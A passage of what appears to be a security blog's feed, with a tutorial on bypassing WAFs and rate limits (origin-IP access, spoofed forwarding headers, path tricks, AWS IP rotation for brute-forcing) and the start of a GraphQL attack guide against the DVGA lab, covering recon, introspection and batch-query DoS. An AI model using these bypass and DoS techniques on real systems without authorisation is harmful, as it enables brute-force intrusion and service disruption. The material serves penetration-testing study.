&lt;p&gt;Sometimes there could be some some &lt;em&gt;Subdomains&lt;/em&gt; and/or &lt;em&gt;endpoints&lt;/em&gt; that are protected by WAF :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_03_110036.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;A very common way to bypass this is by using the IP Address instead of the domain , we can get the IP by using &lt;code&gt;Shodan&lt;/code&gt; extension&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_03_110452.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;But this IP is provided by a CDN (Cloudflare in this example), so it&amp;rsquo;s used by more that one host. Thus, we need to test all active ports until we find which one maps to the website we are testing.&lt;/p&gt;
&lt;p&gt;Scenarios :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl target.com/  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Forbidden &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl ip:port      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Success &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl target.com/  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Success &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl target.com/protected/endpoint  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Forbidden &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl ip:port/protected/endpoint  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Success &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;CDNs &lt;strong&gt;sometimes&lt;/strong&gt; blocks access by IP Address to protect from this bypass technique&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_03_111118.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;6---rate-limits-testing&#34;&gt;6 - Rate Limits Testing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;API providers may include its rate limiting details publicly on its website or in API documentation.&lt;/li&gt;
&lt;li&gt;Check Headers&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;limit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;limit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;remaining&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Other APIs won&amp;rsquo;t have an indication but once you exceed the limit you receive &lt;code&gt;429 Too Many Requests&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;Retry-After:&lt;/code&gt; Indicates when you can submit additional requests.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;How to test Rate Limiting ?&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; avoid being rate limited altogether&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; bypass the mechanism that is blocking you once you are rate limited (Blocked because of IP ? Auth Token ?)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;61---lax-rate-limits&#34;&gt;6.1 - Lax Rate Limits&lt;/h4&gt;
&lt;p&gt;Let&amp;rsquo;s say &lt;code&gt;Rate limit  = 15 000 Request/min&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;-t&lt;/em&gt; option allows you to specify the concurrent &lt;strong&gt;number of connections&lt;/strong&gt;,
&lt;em&gt;-s&lt;/em&gt; option allows you to specify a &lt;strong&gt;time delay&lt;/strong&gt; between requests.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_010914.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;This will send &lt;code&gt;12 000 Request/min&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wfuzz -s 0.0005
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or use Burp &lt;em&gt;Intruder&lt;/em&gt;/&lt;em&gt;Ressource Pool&lt;/em&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_011645.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_011508.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;62---path-bypass&#34;&gt;6.2 - Path Bypass&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;If you reach the rate limit, try &lt;em&gt;Null Bytes&lt;/em&gt; , &lt;em&gt;Case&lt;/em&gt; &amp;amp;  &lt;em&gt;Meaningless Parameters&lt;/em&gt; at the end , this could :
Restart the rate limit
Bypass Rate limiting&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myProfile&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MyProfile&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;my&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;profile&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If meaningless Parameters are restarting rate limiting just change parameter value in every request :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;§&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;§&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Set the attack type to &lt;em&gt;pitchfork&lt;/em&gt; and use the same value for both payload positions.
This tactic allows you to use the smallest number of requests required to brute-force the &lt;strong&gt;uid&lt;/strong&gt;.&lt;/p&gt;
&lt;h4 id=&#34;63---origin-header-spoofing&#34;&gt;6.3 - Origin Header Spoofing&lt;/h4&gt;
&lt;p&gt;Add these headers &lt;strong&gt;one by one&lt;/strong&gt; (If you include all headers at once, you may
receive a 431 Request Header Fields Too Large status code)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sometimes, &lt;strong&gt;User-Agent&lt;/strong&gt; header will be used in combination with other headers to help identify and block an attacker.&lt;/p&gt;
&lt;p&gt;Use &lt;code&gt;SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt&lt;/code&gt; to cycle trough user-agents&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ad-done&#34; data-lang=&#34;ad-done&#34;&gt;title: Bypassed 
You’ll know you’ve succeeded if an `x-rate-limit` header **resets** or if you’re able to make successful requests after being blocked.
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;64---rotating-ip-addresses-in-burp-suite&#34;&gt;6.4 - Rotating IP Addresses in Burp Suite&lt;/h4&gt;
&lt;p&gt;If WAF Blocks IP, Use &lt;em&gt;IP Rotate&lt;/em&gt; &lt;strong&gt;Burp Extension&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_122633.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Install &lt;em&gt;boto3&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip3 install boto3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Install &lt;em&gt;Jython&lt;/em&gt; for BurpSuite&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Install &lt;em&gt;IP Rotate&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Add User&lt;/em&gt; in aws -&amp;gt; IAM
&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123117.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123340.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123417.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Create User&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123526.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Download &lt;em&gt;CSV file&lt;/em&gt; containing your user’s &lt;strong&gt;access key&lt;/strong&gt; and &lt;strong&gt;secret access key&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;In Burp :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_124007.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Save Keys&lt;/em&gt; =&amp;gt; &lt;em&gt;Enable&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Now, security controls that block you based solely on your IP address
will stand no chance.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Attacking GraphQL</title>
      <link>https://flowhero.github.io/newblog/posts/graphql-exploitation/</link>
      <pubDate>Wed, 02 Aug 2023 20:53:26 +0100</pubDate>
      
      <guid>https://flowhero.github.io/newblog/posts/graphql-exploitation/</guid>
      <description>I - DVGA Use the following script to install &amp;amp; run DVGA :
git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git &amp;amp;&amp;amp; cd Damn-Vulnerable-GraphQL-Application docker build -t dvga . docker run -d -t -p 5013:5013 -e WEB_HOST=0.0.0.0 --name dvga dvga II - Toolkits nmap graphql-introspection Altair InQL SQLmap graphw00f III - Recon is GraphQL running ? What Endpoint ? What GraphQL Engine ? Attack Surface ? We can answer all these question using graphw00f :</description>
      <content>&lt;h2 id=&#34;i---dvga&#34;&gt;I - DVGA&lt;/h2&gt;
&lt;p&gt;Use the following script to install &amp;amp; run DVGA :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cd Damn-Vulnerable-GraphQL-Application
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker build -t dvga .
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -d -t -p 5013:5013 -e WEB_HOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0.0.0.0 --name dvga dvga
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ii---toolkits&#34;&gt;II - Toolkits&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;nmap&lt;/em&gt; &lt;strong&gt;graphql-introspection&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Altair&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;InQL&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;SQLmap&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;graphw00f&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;iii---recon&#34;&gt;III - Recon&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;is GraphQL running ?&lt;/li&gt;
&lt;li&gt;What Endpoint ?&lt;/li&gt;
&lt;li&gt;What GraphQL Engine ?&lt;/li&gt;
&lt;li&gt;Attack Surface ?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can answer all these question using &lt;code&gt;graphw00f&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 main&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;5013&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;1---detecting-endpoints&#34;&gt;1 - Detecting endpoints&lt;/h3&gt;
&lt;p&gt;we can use &lt;code&gt;ffuf&lt;/code&gt; to fuzz for endpoints using this wordlist that holds common graphql endpoints&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -u http://localhost/FUZZ -w /home/hero/tools/graphql-tools/endpoints.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;graphql
graphiql
v1/graphql
v2/graphql
v3/graphql
v1/graphiql
v2/graphiql
v3/graphiql
playground
v1/playground
v2/playground
v3/playground
api/v1/playground
api/v2/playground
api/v3/playground
console
api/graphql
api/graphiql
explorer
api/v1/graphql
api/v2/graphql
api/v3/graphql
api/v1/graphiql
api/v2/graphiql
api/v3/graphiql
v1/graphql
api/graphql
v1/api/graphql
graph
v1/graph
graphiql
v1/graphiql
console
query
graphql/console
altair
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;2---introspection-scanning&#34;&gt;2 - Introspection scanning&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap --script&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;graphql-introspection -sV 127.0.0.1 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;5013&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;When introspection is enabled, the entire GraphQL schema can be retrieved with a single query.
&lt;a href=&#34;https://gist.githubusercontent.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da/raw/e50819812a7a8a95b303ac0ea1464e2679e3e4bc/introspection-query.graphql&#34;&gt;https://gist.githubusercontent.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da/raw/e50819812a7a8a95b303ac0ea1464e2679e3e4bc/introspection-query.graphql&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Because the response of introspecion is overwhelming, We use &lt;a href=&#34;https://ivangoncharov.github.io/graphql-voyager/&#34;&gt;GraphQL-voyager&lt;/a&gt;. for &lt;em&gt;nodes&lt;/em&gt; and &lt;em&gt;edges&lt;/em&gt; view&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;copy the response data and paste it into Graphql-voyager’s editor.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;we should also check if the &lt;em&gt;GraphiQL&lt;/em&gt; is enabled. which allows constructing queries in a friendly user interface.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;GraphiQL is usually found in paths such as: /graphiql or __graphiql&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;iv---dos&#34;&gt;IV - DoS&lt;/h2&gt;
&lt;h3 id=&#34;1---batch-queries&#34;&gt;1 - Batch Queries&lt;/h3&gt;
&lt;p&gt;we can only send it using &lt;em&gt;Burp&lt;/em&gt; or &lt;em&gt;curl&lt;/em&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;query&amp;#34;&lt;/span&gt; :&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;query {systemHealth }&amp;#34;&lt;/span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;query&amp;#34;&lt;/span&gt; :&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;query {systemHealth }&amp;#34;&lt;/span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;this shows that batch queries are enabled&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;:{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;systemHealth&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;System Load: 0.00\n&amp;#34;&lt;/span&gt;}},{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;:{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;systemHealth&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;System Load: 0.00\n&amp;#34;&lt;/span&gt;}}]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now you can send 100 queries and overload the system&lt;/p&gt;
&lt;h3 id=&#34;2---deep-recursion-query-attack&#34;&gt;2 - Deep recursion query attack&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;PasteObject&lt;/code&gt; and &lt;code&gt;OwnerObject&lt;/code&gt; cross reference each other so let’s use that.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Automatically&lt;/strong&gt; detect circular relationships in the schema:&lt;/p&gt;
